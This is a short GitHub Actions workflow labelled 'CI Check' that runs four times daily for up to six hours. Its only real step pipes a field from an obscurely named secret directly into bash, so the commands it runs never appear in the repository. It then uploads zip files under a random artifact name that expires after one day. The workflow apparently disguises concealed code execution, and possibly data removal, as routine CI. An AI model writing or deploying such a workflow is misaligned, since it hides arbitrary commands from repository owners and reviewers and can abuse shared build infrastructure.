name: CI Check
on:
  workflow_dispatch:

  schedule:
    - cron: '55 0,6,12,18 * * *'
concurrency:
  group: ${{ github.workflow }}
  cancel-in-progress: false
jobs:
  runner:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 1
      - name: Initialize
        env:
          zg112: ${{ secrets.zg112 }}
        run: |
          printf '%s' "$zg112" | jq -r .v512 | /bin/bash

      - name: Persist results
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: OqmdJZSY
          path: "*.zip"
          retention-days: 1
